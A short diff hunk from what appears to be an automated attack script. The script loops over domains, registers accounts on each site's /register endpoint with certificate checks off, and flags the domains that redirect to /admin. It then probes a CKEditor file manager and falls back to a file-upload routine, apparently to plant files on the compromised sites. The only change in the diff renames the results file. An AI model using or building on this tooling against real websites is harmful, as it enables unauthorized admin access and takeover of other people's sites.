@@ -104,7 +104,7 @@ def process(domain):
                         r = session.post(f"{path}/register", data=payload, allow_redirects=False, timeout=15, verify=False)
                         if "Location" in r.headers and "/admin" in r.headers["Location"]:
                             print(f"[+] Ayos! Nakaregister na sa {domain}")
-                            save_result("register_berhasil.txt", domain)
+                            save_result("register.txt", domain)
                             ck = session.get(f"{domain}/file-manager/ckeditor", allow_redirects=True, timeout=15, verify=False)
                             if not any(x in ck.text for x in ["File Manager"]):
                                 fallback_upload(session, domain, path)
